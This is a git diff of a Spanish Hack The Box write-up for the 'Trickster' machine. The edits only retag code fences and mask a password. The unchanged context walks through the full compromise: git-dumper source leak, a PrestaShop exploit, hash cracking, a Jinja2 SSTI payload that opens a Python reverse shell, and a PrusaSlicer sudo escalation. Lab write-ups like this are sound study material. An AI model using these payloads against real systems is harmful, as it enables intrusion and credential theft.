@@ -11,7 +11,7 @@ description: ""
 ## Reconocimiento
 
 Lanzamos **nmap** a todos los puertos, con scripts y versiones de software:
-```
+```console
 nmap -p- --min-rate 5000 -sVC -Pn -n 10.10.11.34 -oN nmap.txt
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-31 18:07 CET
 Nmap scan report for 10.10.11.34
@@ -40,7 +40,7 @@ Accedemos a la web de compras, identificamos rápidamente las tecnologías despl
 ![](../assets/img/trickster-hackthebox-writeup/3.png)
 
 Utilizamos la herramienta **dirsearch**, encontramos la exposición del directorio *.git*:
-```
+```console
 dirsearch -u http://shop.trickster.htb -x 404
 
   _|. _ _  _  _  _ _|_    v0.4.3
@@ -82,7 +82,7 @@ Target: http://shop.trickster.htb/
 ```
 
 Utilizamos la herramienta git-dumper y extraemos los ficheros:
-```
+```console
 git-dumper http://shop.trickster.htb .
 Warning: Destination '.' is not empty
 [-] Testing http://shop.trickster.htb/.git/HEAD [200]
@@ -125,7 +125,7 @@ En el listado, evidenciamos el directorio *admin634ewutrx1jgitlooaj* donde está
 ![](../assets/img/trickster-hackthebox-writeup/4.png)
 
 Visualizamos la lista de logs, encontramos solo uno de una actualización sobre el panel del administrador, aunque no encontramos nada útil, a excepción del usuario *Adam*:
-```
+```console
 git log                                          
 commit 0cbc7831c1104f1fb0948ba46f75f1666e18e64c (HEAD -> admin_panel)
 Author: adam <adam@trickster.htb>
@@ -169,7 +169,7 @@ Buscando información en internet sobre la versión de **Prestashop**, encontram
 
 ## Explotación
 Ejecutamos el exploit, esperamos unos segundos y lograremos acceso a la máquina:
-```
+```console
 python3 exploit.py --url http://shop.trickster.htb --email adam@trickster.htb --local-ip 10.10.14.152 --admin-path admin634ewutrx1jgitlooaj
 [X] Starting exploit with:
         Url: http://shop.trickster.htb
@@ -200,7 +200,7 @@ $ id
 $ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 Leemos el fichero *parameters.php* y encontramos las credenciales de la base de datos de **Prestashop**:
-```
+```php
 $ cat parameters.php
 <?php return array (
   'parameters' => 
@@ -209,7 +209,7 @@ $ cat parameters.php
     'database_port' => '',
     'database_name' => 'prestashop',
     'database_user' => 'ps_user',
-    'database_password' => 'prest@shop_o',
+    'database_password' => '**************',
     'database_prefix' => 'ps_',
     'database_engine' => 'InnoDB',
     'mailer_transport' => 'smtp',
@@ -220,7 +220,7 @@ $ cat parameters.php
 ```
 
 Accedemos **MariaDB** con las credenciales anteriores, logramos extraer dos credenciales de la base de datos:
-```
+```console
 MariaDB [prestashop]> select email,passwd from ps_employee;
 +---------------------+--------------------------------------------------------------+
 | email               | passwd                                                       |
@@ -233,7 +233,7 @@ MariaDB [prestashop]> select email,passwd from ps_employee;
 MariaDB [prestashop]> 
 ```
 Con la ayuda de **john** y **rockyou**, logramos crackear el hash del usuario *james*:
-```
+```console
 john james.hash --wordlist=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
@@ -247,7 +247,7 @@ Session completed.
 ```
 
 Reutilizamos las credenciales sobre el servicio **SSH**, logramos acceder y leer la flag de usuario:
-```
+```console
 ssh james@trickster.htb                 
 james@trickster.htb's password: 
 Last login: Fri Jan 31 18:00:47 2025 from 10.10.16.10
@@ -261,7 +261,7 @@ james@trickster:~$ cat user.txt
 
 ## Escalada de privilegios
 Lanzamos el script de reconocimiento **lse.sh**, identificamos **Google Chrome** instalado en el directorio *opt*:
-```
+```console
 [!] fst020 Uncommon setuid binaries........................................ yes!
 ---
 /snap/snapd/21759/usr/lib/snapd/snap-confine
@@ -269,7 +269,7 @@ Lanzamos el script de reconocimiento **lse.sh**, identificamos **Google Chrome**
 ```
 
 Nos dirigimos al directorio *opt*, encontramos una carpeta del software **PrusaSlicer**, esto es un software utilizado en impresoras 3D, enumeramos la versión *2.6.1*:
-```
+```console
 james@trickster:/opt/PrusaSlicer$ ls -lna
 total 82196
 drwxr-xr-x 2 0 0     4096 Sep 13 12:24 .
@@ -295,7 +295,7 @@ james@trickster:/opt/PrusaSlicer$
 ```
 
 Listamos los puertos utilizados en la máquina y vemos varias conexiones sobre el puerto 5000 sobre la IP *172.17.0.2*:
-```
+```console
 james@trickster:/$ netstat -putona
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
@@ -317,7 +317,7 @@ tcp        0      0 172.17.0.1:42212        172.17.0.2:5000         TIME_WAIT   
 ```
 
 Revisamos las interfaces de red, y vemos que hay un docker corriendo con la IP *172.17.0.1*, por lo que deberíamos de tener visibilidad a la *172.17.0.2*:
-```
+```console
 james@trickster:/$ ifconfig
 docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
@@ -352,7 +352,7 @@ veth85c5e62: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 ```
 
 Ejecutamos **curl** sobre el activo para comprobar que llegamos:
-```
+```console
 james@trickster:/$ curl http://172.17.0.2:5000
 <!doctype html>
 <html lang=en>
@@ -363,7 +363,7 @@ james@trickster:/$
 ```
 
 Redirigimos el puerto 5000 remoto a nuestra máquina local, con la idea de poder analizar el sitio en busca de vulnerabilidades que nos permitan escalar privilegios o enumerar información relevante:
-```
+```console
 sh -L 5000:172.17.0.2:5000 james@trickster.htb
 james@trickster.htb's password: 
 Last login: Fri Jan 31 19:03:48 2025 from 10.10.14.152
@@ -376,7 +376,7 @@ Buscamos por internet, encontramos un exploit que nos permite ejecutar código r
 - [changedetection < 0.45.20 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/52027)
 
 Ejecutamos el exploit, pero parece que no funciona:
-```
+```console
 python3 52027.py --url http://localhost:5000 --port 443 --ip 10.10.14.152
 Obtained CSRF token: ImJmODRhNGQwNjNjZmQzOGM4NTZhMzc2MGMxNmZlYTRhMzkxZTRhOGQi.Z50gfg.Y-zescMqrNT1rOMRwcNJsYqfyng
 Redirect URL: /login?next=/
@@ -394,7 +394,7 @@ Descargamos la copia de seguridad pulsando en el apartado *BACKUP*, con la idea 
 ![](../assets/img/trickster-hackthebox-writeup/7.png)
 
 En el exploit de Python anterior, vimos la existencia de una flag llamada "*--notification*", identificamos en el pie del campo "*Notification Body*" que usa **Jinja2**, esto nos permite ejecutar ataques de tipo *SSTI* (*Server-Side Template Injection*), reutilizamos el payload del exploit, nos ponemos en escucha por el puerto 443 y pulsamos en "*Send test notification*":
-```python
+```console
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<IP>\",<PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}{% endif %}{% endfor %}
 ```
 ![](../assets/img/trickster-hackthebox-writeup/8.png)
@@ -419,7 +419,7 @@ drwxr-xr-x 1 0 0 4096 Sep 16 15:32 changedetectionio
 ```
 
 Realizamos un reconocimiento sobre el **docker**, enumeramos una carpeta llamada *datastore*, vemos una estructura similar al backup anteriormente descargado, pero con la diferencia de un directorio extra llamada *Backups*, descargamos ambos ficheros *zip*:
-```
+```console
 # ls /
 ls /
 app  boot	dev  home  lib64  mnt  proc  run   srv	tmp  var
@@ -455,7 +455,7 @@ Tras descomprimirlo con **brotli**, encontramos en uno de los ficheros las crede
 ```
 
 Nos autenticamos con *Adam* y vemos que él si puede ejecutar prusaslicer como usuario privilegiado con **SUDO**:
-```
+```console
 james@trickster:/$ su adam
 Password: 
 adam@trickster:/$ sudo -l
@@ -471,7 +471,7 @@ Buscando por internet, encontramos el siguiente exploit:
 ](https://github.com/suce0155/prusaslicer_exploit/)
 
 Seguimos las instrucciones del exploit, modificamos la IP y puerto sobre el fichero *exploit.sh*, si vemos el contenido del fichero *evil.3mf*, contempla el parámetro *post_process* tal y como vimos en el exploit anterior, lo que hará será otorgar permisos y ejecutar nuestro fichero *exploit.sh*, y con el usuario *root*:
-```
+```console
 ; perimeter_extrusion_width = 0.5
 ; perimeter_generator = arachne
 ; perimeter_speed = 70
@@ -483,8 +483,7 @@ Seguimos las instrucciones del exploit, modificamos la IP y puerto sobre el fich
 ```
 
 Nos ponemos en escucha por el puerto 443 y ejecutamos el binario indicando el fichero malicioso:
-
-```
+```console
 adam@trickster:~$ sudo -u root /opt/PrusaSlicer/prusaslicer -s evil.3mf 
 10 => Processing triangulated mesh
 20 => Generating perimeters
@@ -504,7 +503,7 @@ Also consider enabling brim.
 ```
 
 Conseguimos conexión con el usuario *root*, y leemos la última flag:
-```
+```console
 sudo nc -nvlp 443   
 [sudo] password for kali: 
 listening on [any] 443 ...
